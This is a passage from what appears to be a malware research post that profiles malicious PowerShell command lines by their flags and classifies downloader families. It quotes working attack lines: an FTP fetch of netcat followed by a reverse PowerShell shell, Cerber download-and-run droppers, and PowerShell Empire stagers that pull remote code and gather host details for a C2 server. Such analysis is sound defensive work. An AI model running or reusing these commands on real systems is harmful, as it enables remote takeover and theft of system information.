			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
powershell -noP -nonI -Win hidden -c sc ftp.txt -val \"open\" -enc ascii; ac ftp.txt -val \"192.168.52.129\" -enc ascii; ac ftp.txt -val \"test\" -enc ascii; ac ftp.txt -val \"test\" -enc ascii; ac ftp.txt -val \"bin\" -enc ascii; ac ftp.txt -val \"GET\" -enc ascii; ac ftp.txt -val \"nc.exe\" -enc ascii; ac ftp.txt -val \"nc.exe\" -enc ascii; ac ftp.txt -val \"bye\" -enc ascii; ftp -s:ftp.txt; rm ftp.txt; ./nc.exe -e powershell.exe 192.168.52.129 3724</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c94d719688228-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c94d719688228-1"><span class="crayon-v">powershell</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">noP</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">nonI</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Win </span><span class="crayon-v">hidden</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-e">sc </span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">val</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>"<span class="crayon-v">open</span><span class="crayon-sy">\</span>"<span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">enc </span><span class="crayon-v">ascii</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">ac </span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">val</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>"<span class="crayon-cn">192.168.52.129</span><span class="crayon-sy">\</span>"<span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">enc </span><span class="crayon-v">ascii</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">ac </span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">val</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>"<span class="crayon-v">test</span><span class="crayon-sy">\</span>"<span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">enc </span><span class="crayon-v">ascii</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">ac </span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">val</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>"<span class="crayon-v">test</span><span class="crayon-sy">\</span>"<span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">enc </span><span class="crayon-v">ascii</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">ac </span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">val</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>"<span class="crayon-v">bin</span><span class="crayon-sy">\</span>"<span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">enc </span><span class="crayon-v">ascii</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">ac </span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">val</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>"<span class="crayon-v">GET</span><span class="crayon-sy">\</span>"<span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">enc </span><span class="crayon-v">ascii</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">ac </span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">val</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>"<span class="crayon-v">nc</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-sy">\</span>"<span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">enc </span><span class="crayon-v">ascii</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">ac </span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">val</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>"<span class="crayon-v">nc</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-sy">\</span>"<span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">enc </span><span class="crayon-v">ascii</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">ac </span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">val</span><span class="crayon-h"> </span><span class="crayon-sy">\</span>"<span class="crayon-v">bye</span><span class="crayon-sy">\</span>"<span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">enc </span><span class="crayon-v">ascii</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">ftp</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">s</span><span class="crayon-o">:</span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">rm </span><span class="crayon-v">ftp</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-v">nc</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-v">powershell</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.52.129</span><span class="crayon-h"> </span><span class="crayon-cn">3724</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p></p>
<table width="100%">
<tbody>
<tr>
<td width="148"><strong>Flag</strong></td>
<td width="148"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="148">"-c"</td>
<td width="148"> 1</td>
<td width="148"> 0.02%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Finally, I’ll end the parameter analysis by looking briefly at the top 10 combinations seen throughout this sample set.</p>
<table width="100%">
<tbody>
<tr>
<td><strong>Flag Combination</strong></td>
<td><strong>Count</strong></td>
<td><strong>% of Total</strong></td>
</tr>
<tr>
<td>"-window hidden -enc"</td>
<td>1,242</td>
<td>30.29%</td>
</tr>
<tr>
<td>"-enc"</td>
<td>986</td>
<td>24.04%</td>
</tr>
<tr>
<td>"-nop -noni -enc"</td>
<td>736</td>
<td>17.95%</td>
</tr>
<tr>
<td>"-NoP -sta -NonI -W Hidden -Enc"</td>
<td>206</td>
<td>5.02%</td>
</tr>
<tr>
<td>"-EncodedCommand"</td>
<td>169</td>
<td>4.12%</td>
</tr>
<tr>
<td>"-ep bypass -noni -w hidden -enc"</td>
<td>102</td>
<td>2.48%</td>
</tr>
<tr>
<td>"-NoP -NonI -W Hidden -Enc"</td>
<td>60</td>
<td>1.46%</td>
</tr>
<tr>
<td>"-nop  -win hidden -noni -enc"</td>
<td>57</td>
<td>1.39%</td>
</tr>
<tr>
<td>"-executionpolicy bypass -windowstyle hidden -enc"</td>
<td>51</td>
<td>1.24%</td>
</tr>
<tr>
<td>"-nop -exec bypass -win Hidden -noni -enc"</td>
<td>41</td>
<td>1.00%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Even accounting for changes in case, the results only increase by a handful of samples in each category.</p>
<p>While doing the research to try and identify unique signatures for identification, I found multiple examples of the below, wherein the code author changes the parameters for a newer version of their tool.</p>
<p><img class="alignnone size-full wp-image-25155" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig6.png" alt="fig6" width="899" height="84" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig6.png 899w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig6-300x28.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig6-768x72.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig6-370x35.png 370w" sizes="(max-width: 899px) 100vw, 899px" /></p>
<p><em>Figure 6 Code Author Modified parameters between versions of a tool</em></p>
<p>This reduces the overall aggregate count for those families but I don’t believe it has much impact on the totals. In my review of the tools, authors are less focused on the dynamic ordering of the parameters or potentially dynamically adjusting parameter length to further obscure their attacks; instead they add in basic capitalization randomization and focus on the “meat” of their code. This can allow for some low-fidelity profiling based on just the way the PowerShell command is launched.</p>
<p>In addition, the top three combinations, which account for 72% of all combinations, are predominately straightforward and focused on just running code versus any clever attempts at further hiding their attacks from the user.</p>
<h3>Post-Analysis Data / Stats</h3>
<p>Next I’ll go over each of the identified variants and review their functionality. For each one that downloads a file or script, I’ll include the observed IP/Domain/URL at the end of this blog. Some of these may be malicious, some of them may be pentesters, and some of them may be people doing random testing of new techniques; unfortunately, it’s not usually possible to infer intention when doing bulk analysis but the data is provided for the reader to use as they see fit.</p>
<p><strong>Downloaders</strong></p>
<p>PowerShell code identified with the primary intention of downloading and running a secondary payload or executing PowerShell code obtained remotely.</p>
<p><strong>Downloader DFSP (1,373 Samples - 33.49% Coverage)</strong></p>
<p>This is a quintessential example of using PowerShell to download and run a file. It’s basically verbatim of the results you get when using Google to search for ways to download and run a file. As such, I’ve used the below template as a generic classification for the base64 encoded data that acts as a simple downloader for the true payload.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c956978875555" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 (New-Object System.Net.WebClient).DownloadFile('http://cajos[.]in/0x/1.exe','mess.exe');Start-Process 'mess.exe'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c956978875555-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c956978875555-1"><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-s">'http://cajos[.]in/0x/1.exe'</span><span class="crayon-sy">,</span><span class="crayon-s">'mess.exe'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-i">Process</span><span class="crayon-h"> </span><span class="crayon-s">'mess.exe'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>As was previously pointed out, almost all of the detections matching this category were linked back to the Microsoft Word documents launching this PowerShell command via a macro to download Cerber. One unique pattern observed in this sample was the usage of environment variables, in addition to their URI pattern.</p>
<p>Downloader for Cerber –</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c959169578750" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 (New-Object System.Net.WebClient).DownloadFile('http://94.102.53[.]238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c959169578750-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c959169578750-1"><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-s">'http://94.102.53[.]238/~yahoo/csrsv.exe'</span><span class="crayon-sy">,</span><span class="crayon-s">"$env:APPDATA\csrsv.exe"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-e">Process</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"$env:APPDATA\csrsv.exe"</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p><strong>PowerShell Empire (293 Samples – 7.15% Coverage)</strong></p>
<p>For this next one, the samples are using PowerShell Empire’s EncryptedScriptDropper to download a script remotely and decrypt it with an embedded XOR key.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c95a664666551" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$Wc=NeW-ObjeCt SySTEM.Net.WebCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadeRS.ADd('User-Agent',$u);$wc.PrOxy = [SyStem.NeT.WEbReQUeSt]::DEFauLTWeBProxy;$WC.PRoXY.CrEdENTIaLS = [SYStEM.NeT.CReDEnTiALCaChE]::DEFaulTNeTworKCREdeNtiaLS;$K='0192023a7bbd73250516f069df18b500';$i=0;[CHAr[]]$B=([CHaR[]]($wc.DOwnloaDSTRing("http://23.239.12.15:8080/index.asp")))|%{$_-BXOr$k[$i++%$K.LENgTh]};IEX ($B-jOIn'')</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c95a664666551-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c95a664666551-1"><span class="crayon-sy">$</span><span class="crayon-v">Wc</span><span class="crayon-o">=</span><span class="crayon-r">NeW</span><span class="crayon-o">-</span><span class="crayon-t">ObjeCt</span><span class="crayon-h"> </span><span class="crayon-v">SySTEM</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebCLiEnt</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">u</span><span class="crayon-o">=</span><span class="crayon-s">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">WC</span><span class="crayon-sy">.</span><span class="crayon-v">HeadeRS</span><span class="crayon-sy">.</span><span class="crayon-e">ADd</span><span class="crayon-sy">(</span><span class="crayon-s">'User-Agent'</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">u</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">wc</span><span class="crayon-sy">.</span><span class="crayon-v">PrOxy</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">SyStem</span><span class="crayon-sy">.</span><span class="crayon-v">NeT</span><span class="crayon-sy">.</span><span class="crayon-v">WEbReQUeSt</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">DEFauLTWeBProxy</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">WC</span><span class="crayon-sy">.</span><span class="crayon-v">PRoXY</span><span class="crayon-sy">.</span><span class="crayon-v">CrEdENTIaLS</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">SYStEM</span><span class="crayon-sy">.</span><span class="crayon-v">NeT</span><span class="crayon-sy">.</span><span class="crayon-v">CReDEnTiALCaChE</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">DEFaulTNeTworKCREdeNtiaLS</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">K</span><span class="crayon-o">=</span><span class="crayon-s">'0192023a7bbd73250516f069df18b500'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-t">CHAr</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">B</span><span class="crayon-o">=</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-t">CHaR</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">wc</span><span class="crayon-sy">.</span><span class="crayon-e">DOwnloaDSTRing</span><span class="crayon-sy">(</span><span class="crayon-s">"http://23.239.12.15:8080/index.asp"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-o">|</span><span class="crayon-o">%</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">_</span><span class="crayon-o">-</span><span class="crayon-v">BXOr</span><span class="crayon-sy">$</span><span class="crayon-v">k</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-o">++</span><span class="crayon-o">%</span><span class="crayon-sy">$</span><span class="crayon-v">K</span><span class="crayon-sy">.</span><span class="crayon-v">LENgTh</span><span class="crayon-sy">]</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-e">IEX</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">B</span><span class="crayon-o">-</span><span class="crayon-i">jOIn</span><span class="crayon-s">''</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p>In this example, the XOR key is “0192023a7bbd73250516f069df18b500” and the pulled down script, once decoded with that key, is the PowerShell Empire agent stager <a href="https://github.com/EmpireProject/Empire/blob/master/data/agent/stager_hop.ps1">script</a> that will POST system information to the C2 server and then download the encrypted Stage 1 Empire payload.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c95b837659925" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
'FunCtION StaRt-NegoTiATe{param($s,$SK,$UA="lol")Add-TypE -AsSeMBLY SYSteM.SECUriTY;AdD-TypE -aSSEMBly SYSTEm.CoRe;$ErrorActionPreference = "SilentlyContinue";$E=[SYstem.TExT.ENCoDING]::ASCII;$AES=NeW-OBjecT SYsTeM.SeCURiTy.CRyptoGrapHY.AESCRyPToSeRVicePrOvIdER;$IV = [BYTE] 0..255 | GeT-RandOm -coUNt 16;$AES.Mode="CBC"; $AES.Key=$e.GetBytes($SK); $AES.IV = $IV;$cSp = NEW-OBJECT SYStEM.SecURity.CrYPtOGRAPHy.CSpPaRAmeTERS;$csP.FLAGs = $cSP.FlagS -boR [SYsTeM.SeCurITY.CryptogRaphy.CsPPROViDErFlAGs]::UsEMAcHINEKeySTore;$Rs = NEW-ObJecT SySTEm.SecURIty.CRyptograPHy.RSACRYPTOSERvICEPROViDeR -ARGuMenTLIsT 2048,$CSP;$rk=$Rs.TOXMlStriNg($FALse);$r=1..16|FOrEacH-ObJEcT{GEt-RANDOm -MAx 26};$ID=(\'ABCDEFGHKLMNPRSTUVWXYZ123456789\'[$r] -joIN \'\');$iB=$E.gEtbYTes($Rk);$eb=$IV+$AES.CReaTeENCRyptoR().TRANSFoRmFiNalBLOcK($Ib,0,$Ib.LENgtH);IF(-Not $wc){$wc=nEw-oBJECt sYstEM.Net.WEBCLient;$WC.ProxY = [SySTem.NET.WeBReqUEsT]::GETSysTeMWEbPRoxY();$Wc.Proxy.CrEDentIals = [SYStem.Net.CredENtIalCAche]::DEFAUlTCRedentIaLs;}$wc.Headers.Add("User-Agent",$UA);$wc.Headers.Add("Cookie","SESSIONID=$ID");$raw=$wc.UploadData($s+"index.jsp","POST",$eb);$dE=$E.GETSTRing($Rs.deCrYPt($raw,$FalSE));$EpOCh=$de[0..9] -joIN\'\';$KeY=$dE[10..$de.LengTH] -jOIn \'\';$AES=NEw-ObJEct SYsTEm.SEcurity.CRyPtoGRAPHY.AEsCrYPtOSerVIcEPRoVidEr;$IV = [ByTe] 0..255 | GET-RaNdom -couNT 16;$AES.Mode="CBC"; $AES.Key=$e.GetBytes($key); $AES.IV = $IV;$i=$S+\'|\'+[EnvIrONment]::UsERDOmAInNAmE+\'|\'+[ENvIRonmeNt]::UsERNaME+\'|\'+[ENvIRONmeNt]::MaChinEName;$P=(gwMi WIN32_NeTWorkAdAPTErCoNfIGurAtioN|WherE{$_.IPAdDRess}|SelECt -ExpANd IPADDReSS);$ip = @{$TrUe=$P[0];$FalsE=$P}[$P.LeNgTh -lt 6];If(!$IP -or $ip.trIm() -EQ \'\') {$Ip=\'0.0.0.0\'};$i+="|$ip";$I+=\'|\'+(GEt-WmIOBJect WIn32_OpERAtiNgSystEM).NAME.splIT(\'|\')[0];if(([Environment]::UserName).ToLower() -eq "system"){$i+=\'|True\'}else {$i += "|" +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}$n=[SySTeM.DIAgNoSTICS.ProceSS]::GetCUrREntPRocEss();$i+=\'|\'+$n.PROCEssNAMe+\'|\'+$n.ID;$I += \'|\' + 